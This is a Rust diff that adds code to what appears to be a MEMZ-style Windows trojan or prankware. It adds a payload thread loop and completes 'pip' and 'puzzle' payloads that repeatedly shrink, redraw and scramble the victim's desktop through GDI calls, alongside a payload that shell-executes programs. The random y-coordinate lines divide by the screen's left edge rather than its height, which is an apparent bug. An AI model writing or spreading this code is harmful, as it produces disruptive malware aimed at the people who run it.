@@ -1,8 +1,12 @@
-use std::{mem::size_of, thread};
+use std::{
+    mem::size_of,
+    thread::{self, sleep},
+    time::Duration,
+};
 
 use super::{
     callback::{enum_child_proc, msg_box_hook},
-    define::PAYLOAD,
+    define::{Payload, PAYLOAD},
 };
 use crate::{
     convert_str::ToPCSTRWrapper,
@@ -20,15 +24,15 @@ use windows::{
     core::PCSTR,
     Win32::{
         Foundation::{GetLastError, HMODULE, HWND, LPARAM, POINT, RECT},
-        Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, NOTSRCCOPY},
+        Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, StretchBlt, NOTSRCCOPY, SRCCOPY},
         Media::Audio::{PlaySoundA, SND_ASYNC},
         System::LibraryLoader::GetModuleHandleA,
         UI::{
             Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, VIRTUAL_KEY},
             WindowsAndMessaging::{
                 DrawIcon, EnumChildWindows, GetCursorPos, GetDesktopWindow, GetWindowRect,
-                LoadIconA, SetCursorPos, HICON, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON,
-                SM_CXSCREEN, SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
+                SetCursorPos, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON, SM_CXSCREEN,
+                SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
             },
         },
     },
@@ -76,6 +80,26 @@ pub const PAYLOADS: &[PAYLOAD] = &[
         delay: 15000,
     },
 ];
+
+pub const N_PAYLOADS: usize = PAYLOADS.len();
+
+pub fn payload_thread(parameter: &Payload) {
+    let mut delay = 0;
+    let mut times = 0;
+    let mut runtime = 0;
+
+    let payload = parameter;
+
+    loop {
+        if delay == 0 {
+            delay = (payload.payload_function)(times, runtime);
+            times += 1;
+        }
+        delay -= 1;
+        sleep(Duration::from_millis(10));
+        runtime += 1;
+    }
+}
 
 fn payload_execute(times: i32, _runtime: i32) -> i32 {
     wrap_shell_execute_a(
@@ -332,13 +356,12 @@ fn payload_draw_errors(times: i32, _runtime: i32) -> i32 {
             write_log(LogType::ERROR, LogLocation::MSG, "Failed ReleaseDC()\n");
             #[cfg(feature = "DEBUG_MODE")]
             write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
-            0
         } else {
             #[cfg(feature = "DEBUG_MODE")]
             write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
-            1
         }
     }
+    2
 }
 
 fn payload_change_text(_times: i32, _runtime: i32) -> i32 {
@@ -348,15 +371,112 @@ fn payload_change_text(_times: i32, _runtime: i32) -> i32 {
     50
 }
 
-fn payload_pip(times: i32, runtime: i32) -> i32 {
+fn payload_pip(times: i32, _runtime: i32) -> i32 {
     unsafe {
         let hwnd = GetDesktopWindow();
         let hdc = GetWindowDC(hwnd);
-        let rekt: RECT = Default::default();
+        let mut rekt: RECT = Default::default();
+        GetWindowRect(hwnd, &mut rekt);
+        if !StretchBlt(
+            hdc,
+            50,
+            50,
+            rekt.right - 100,
+            rekt.bottom - 100,
+            hdc,
+            0,
+            0,
+            rekt.right,
+            rekt.bottom,
+            SRCCOPY,
+        )
+        .as_bool()
+        {
+            #[cfg(not(feature = "DEBUG_MODE"))]
+            write_log(LogType::ERROR, LogLocation::MSG, "Failed StretchBlt()\n");
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::ERROR, LogLocation::ALL, "Failed StretchBlt()\n");
+        } else {
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS StretchBlt()");
+        }
+        if ReleaseDC(hwnd, hdc) == 0 {
+            #[cfg(not(feature = "DEBUG_MODE"))]
+            write_log(LogType::ERROR, LogLocation::MSG, "Failed ReleaseDC()\n");
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
+        } else {
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
+        }
     }
-    todo!()
+    (200.0 / (times as f32 / 5.0 + 1.0) + 4.0) as i32
 }
 
-fn payload_puzzle(times: i32, runtime: i32) -> i32 {
-    todo!()
+fn payload_puzzle(times: i32, _runtime: i32) -> i32 {
+    unsafe {
+        let hwnd = GetDesktopWindow();
+        let hdc = GetWindowDC(hwnd);
+        let mut rekt: RECT = Default::default();
+        match GetWindowRect(hwnd, &mut rekt).as_bool() {
+            true => {
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS GetWindowRect()");
+            }
+            false => {
+                #[cfg(not(feature = "DEBUG_MODE"))]
+                write_log(
+                    LogType::ERROR,
+                    LogLocation::MSG,
+                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
+                );
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(
+                    LogType::ERROR,
+                    LogLocation::ALL,
+                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
+                );
+            }
+        };
+
+        let x1 = rand::random::<i32>() % (rekt.right - 100);
+        let y1 = rand::random::<i32>() % (rekt.left - 100);
+        let x2 = rand::random::<i32>() % (rekt.right - 100);
+        let y2 = rand::random::<i32>() % (rekt.left - 100);
+        let width = rand::random::<i32>() % 600;
+        let height = rand::random::<i32>() % 600;
+
+        match BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY).as_bool() {
+            true => {
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS BitBlt()");
+            }
+            false => {
+                #[cfg(not(feature = "DEBUG_MODE"))]
+                write_log(
+                    LogType::ERROR,
+                    LogLocation::MSG,
+                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
+                );
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(
+                    LogType::ERROR,
+                    LogLocation::ALL,
+                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
+                );
+            }
+        }
+
+        if ReleaseDC(hwnd, hdc) == 0 {
+            #[cfg(not(feature = "DEBUG_MODE"))]
+            write_log(LogType::ERROR, LogLocation::MSG, "Failed ReleaseDC()\n");
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
+        } else {
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
+        }
+    }
+
+    (200.0 / (times as f32 / 5.0 + 1.0) + 3.0) as i32
 }
